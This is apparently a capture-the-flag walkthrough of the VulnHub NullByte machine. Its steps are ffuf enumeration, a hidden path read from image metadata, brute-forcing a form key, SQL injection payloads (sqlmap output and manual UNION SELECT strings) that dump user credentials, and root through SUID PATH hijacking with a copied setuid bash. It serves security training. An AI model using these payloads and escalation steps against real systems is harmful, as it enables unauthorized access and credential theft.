# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/NullByte]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.11/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 196, Words: 20, Lines: 11]
index.html              [Status: 200, Size: 196, Words: 20, Lines: 11]
index.html              [Status: 200, Size: 196, Words: 20, Lines: 11]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 1983 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
- `phpmyadmin`
- `uploads`


# Initial Foothold
## TCP/80 - HTTP - Image Forensics + HTTP Form Bruteforce
1. View enumerated directories
	- `index.html`
		![](images/Pasted%20image%2020220203190733.png)
	- `phpmyadmin`
		![](images/Pasted%20image%2020220203190754.png)
	- `uploads`
		![](images/Pasted%20image%2020220203190824.png)
2. Enumerate `uploads`
	```
	┌──(root💀kali)-[~/vulnHub/NullByte]
	└─# ffuf -u http://192.168.110.11/uploads/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.php,.txt' -fc 403

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.11/uploads/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .php .txt 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response status: 403
	________________________________________________
	index.html              [Status: 200, Size: 113, Words: 6, Lines: 7]
	:: Progress: [18460/18460] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
	- `uploads` is a static html page, not a directory
3. Tried some default creds on `phpmyadmin`, failed
4. Only clue we have is the image, download the image
	```
	┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http]
	└─# wget -q http://192.168.110.11/main.gif
	```
5. Detect any hidden text/files
	```
	┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http]
	└─# exiftool main.gif | grep -i comment
	Comment                         : P-): kzMb5nVYJw
	```
	- `kzMb5nVYJw`
6. Proceed to `/kzMb5nVYJw`
	![](images/Pasted%20image%2020220203204615.png)
	- "password ain't that complex"
7. Bruteforce
	```
	┌──(root💀kali)-[~/vulnHub/NullByte]
	└─# ffuf -d "key=FUZZ" -u http://192.168.110.11/kzMb5nVYJw/index.php -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fw 19

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : POST
	 :: URL              : http://192.168.110.11/kzMb5nVYJw/index.php
	 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
	 :: Header           : Content-Type: application/x-www-form-urlencoded
	 :: Data             : key=FUZZ
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 19
	________________________________________________

	elite                   [Status: 200, Size: 145, Words: 9, Lines: 7]
	```
8. Submit form w/ elite
	![](images/Pasted%20image%2020220203205259.png)
	
## TCP/80 - HTTP - SQLi Database Enum w/ SQLMap
9. Check if it is susceptible to SQLi
	```
	┌──(root💀kali)-[~/vulnHub/NullByte]
	└─# ffuf -u http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ -w /usr/share/wordlists/sqli/vulnCheck.txt -fw 3

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/sqli/vulnCheck.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 3
	________________________________________________

	" OR 1 = 1 -- -         [Status: 200, Size: 168, Words: 33, Lines: 1]
	" OR "" = "             [Status: 200, Size: 168, Words: 33, Lines: 1]
	"                       [Status: 200, Size: 168, Words: 33, Lines: 1]
	#                             [Status: 200, Size: 224, Words: 33, Lines: 2]
	:: Progress: [42/42] :: Job [1/1] :: 54 req/sec :: Duration: [0:00:03] :: Errors: 3 ::
	```
	![](images/Pasted%20image%2020220203210327.png)
10. Enumerate the database w/ SQLMAP
	1. Enumerate database
		```
		┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
		└─# sqlmap -r sqli.txt -p usrtosearch --dbs --output-dir=$(pwd)/sqlmap

		
		Parameter: usrtosearch (GET)
		Type: boolean-based blind
		Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
		Payload: usrtosearch=" AND 5195=5195#

		Type: error-based
		Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
		Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL

		Type: time-based blind
		Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
		Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj

		Type: UNION query
		Title: MySQL UNION query (NULL) - 3 columns
		Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#

		available databases [5]:
		[*] information_schema
		[*] mysql
		[*] performance_schema
		[*] phpmyadmin
		[*] seth
		```
	2. Enumerate tables `seth` database
		```
		┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
		└─# sqlmap -r sqli.txt -p usrtosearch -D seth --tables --output-dir=$(pwd)/sqlmap

		Parameter: usrtosearch (GET)
		Type: boolean-based blind
		Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
		Payload: usrtosearch=" AND 5195=5195#

		Type: error-based
		Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
		Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL

		Type: time-based blind
		Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
		Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj

		Type: UNION query
		Title: MySQL UNION query (NULL) - 3 columns
		Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#

		Database: seth
		[1 table]
		+-------+
		| users |
		+-------+
		```
	3. Dump `users` table
		```
		┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
		└─# sqlmap -r sqli.txt -p usrtosearch -D seth -T users --dump --output-dir=$(pwd)/sqlmap 


		Parameter: usrtosearch (GET)
		Type: boolean-based blind
		Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
		Payload: usrtosearch=" AND 5195=5195#

		Type: error-based
		Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
		Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL

		Type: time-based blind
		Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
		Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj

		Type: UNION query
		Title: MySQL UNION query (NULL) - 3 columns
		Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#

		Database: seth
		Table: users
		[2 entries]
		+----+---------------------------------------------+--------+------------+
		| id | pass                                        | user   | position   |
		+----+---------------------------------------------+--------+------------+
		| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
		| 2  | --not allowed--                             | isis   | employee   |
		+----+---------------------------------------------+--------+------------+
		```
11. Pass is base64 encoded & hashed w/ md5
	![](images/Pasted%20image%2020220203213403.png)
	- ramses:omega


## TCP/80 - HTTP - SQLi Database Enum Manual
1. Check if it is susceptible to SQLi
	![](images/Pasted%20image%2020220204002009.png)
1. Determine SQL query code
	![](images/Pasted%20image%2020220204001550.png)
2. Hypothesis
	```
	SELECT id, name, position FROM users WHERE name LIKE "%<input_field>%"
	
	# Instead of ', " is used, thus " allows us to close the previous query and start another one (UNION SELECT)
	```
3. Determine the number of columns & reflected columns in this table
	```
	Plain Text:
	"UNION SELECT 1,2,3-- -
	
	URL Encoded:
	"UNION+SELECT+1,2,3--+- 
	
	# Usually either # or -- - would work, but for this, only -- - worked
	```
	![](images/Pasted%20image%2020220204002513.png)
4. Determine databases
	```
	Plain Text:
	"UNION SELECT group_concat(SCHEMA_NAME),2,3 FROM information_schema.schemata-- -
	
	URL Encoded:
	"UNION+SELECT+group_concat(SCHEMA_NAME),2,3+FROM+information_schema.schemata--+-
	```
	![](images/Pasted%20image%2020220204003336.png)
	```
	available databases [5]:
	[*] information_schema
	[*] mysql
	[*] performance_schema
	[*] phpmyadmin
	[*] seth
	```
5. Determine tables in `seth` database
	```
	Plain Text:
	"UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema='seth'-- -
	
	URL Encoded:
	"UNION+SELECT+group_concat(table_name),2,3+FROM+information_schema.tables+WHERE+table_schema='seth'--+-
	```
	![](images/Pasted%20image%2020220204003838.png)
	```
	Database: seth
	[1 Table]
	users
	```
6. Determine columns in `users` table from `seth` database
	```
	Plain Text:
	"UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
	
	URL Encoded:
	"UNION+SELECT+group_concat(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='users'--+-
	```
	![](images/Pasted%20image%2020220204004239.png)
	```
	Database: seth
	Table: users
	[3 Columns]
	id
	user
	pass
	position
	```
7. Determine value of columns in `users` table from `seth` database
	```
	Plain Text
	"UNION SELECT group_concat(user,':',pass),2,3 FROM seth.users -- - 
	
	URL Encoded:
	"UNION+SELECT+group_concat(user,':',pass),2,3+FROM+seth.users+--+- 
	```
	![](images/Pasted%20image%2020220204004654.png)
	```
	Database: seth
	Table: users
	[Columns: user:pass]
	ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
	isis:--not allowed--
	```


## TCP/777 - SSH
1. SSH w/ ramses:omega
	![](images/Pasted%20image%2020220203213517.png)


# Privilege Escalation
## Root - Via SUID Binary (Path Hijacking)
1. Enumerate SUID Binaries
	```
	ramses@NullByte:~$ find / -perm -4000 2>/dev/null 
	/usr/lib/openssh/ssh-keysign
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/pt_chown
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/bin/procmail
	/usr/bin/at
	/usr/bin/chfn
	/usr/bin/newgrp
	/usr/bin/chsh
	/usr/bin/gpasswd
	/usr/bin/pkexec
	/usr/bin/passwd
	/usr/bin/sudo
	/usr/sbin/exim4
	/var/www/backup/procwatch <- Suspicious
	```
2. Execute `/var/www/backup/procwatch`, to see what it does
	```
	ramses@NullByte:~$ /var/www/backup/procwatch
	  PID TTY          TIME CMD
	 3311 pts/0    00:00:00 procwatch
	 3312 pts/0    00:00:00 sh
	 3313 pts/0    00:00:00 ps
	ramses@NullByte:~$ 
	```
	- Based on this, i think `ps` is being executed
3. View contents of `/var/www/backup/procwatch`
	```
	ramses@NullByte:~$ strings /var/www/backup/procwatch | grep ps
	```
	- Strings did not reveal, `ps` being called
4. Assumes it calls `ps` w/o specifying its full path
5. Exploit via Path Hijacking
	1. Prepend `/tmp` to ramses `Path` environment variable
		```
		ramses@NullByte:~$ export PATH=/tmp:$PATH
		ramses@NullByte:~$ echo $PATH
		/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
		ramses@NullByte:~$ 
		```
	2. Create binary to spawn root shell
		```
		ramses@NullByte:~$ echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > /tmp/ps; chmod 4777 /tmp/ps;
		ramses@NullByte:~$ ls -l /tmp
		total 8
		-rwsrwxrwx 1 ramses ramses   54 Feb  4 05:49 ps
		drwx------ 3 root   root   4096 Feb  4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf
		ramses@NullByte:~$ 
		```
	3. Check if `ps` from `/tmp` directory is called first, before `/bin/ps`
		```
		ramses@NullByte:~$ which ps
		/tmp/ps
		ramses@NullByte:~$
		```
	4. Execute `procwatch` to create root shell
		```
		ramses@NullByte:~$ /var/www/backup/procwatch
		ramses@NullByte:~$ ls -l /tmp
		total 1088
		-rwsrwxrwx 1 ramses ramses      54 Feb  4 05:49 ps
		-rwsr-xr-x 1 root   ramses 1105840 Feb  4 05:50 rootbash
		drwx------ 3 root   root      4096 Feb  4 02:11 systemd-private-dc0b6a1de996417bb76e2cd0ae273e30-cups.service-2HAlbf
		ramses@NullByte:~$ 
		```
	5. Obtain root shell
		```
		ramses@NullByte:~$ /tmp/rootbash -p
		rootbash-4.3# id;whoami
		uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
		root
		rootbash-4.3# 
		```
		![](images/Pasted%20image%2020220203215116.png)
6. Root Flag
	```
	rootbash-4.3# cat proof.txt 
	adf11c7a9e6523e630aaf3b9b7acb51d

	It seems that you have pwned the box, congrats. 
	Now you done that I wanna talk with you. Write a walk & mail at
	xly0n@sigaint.org attach the walk and proof.txt
	If sigaint.org is down you may mail at nbsly0n@gmail.com


	USE THIS PGP PUBLIC KEY

	-----BEGIN PGP PUBLIC KEY BLOCK-----
	Version: BCPG C# v1.6.1.0

	mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
	Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
	e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
	Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
	+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
	YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
	Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
	HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
	m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
	XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
	kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
	TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
	Gms=
	=PiAQ
	-----END PGP PUBLIC KEY BLOCK-----

	rootbash-4.3# 
	```
	



---
Tags: #image-forensic #exploit/sqli/database-enum #linux-priv-esc/suid/path-hijacking 

---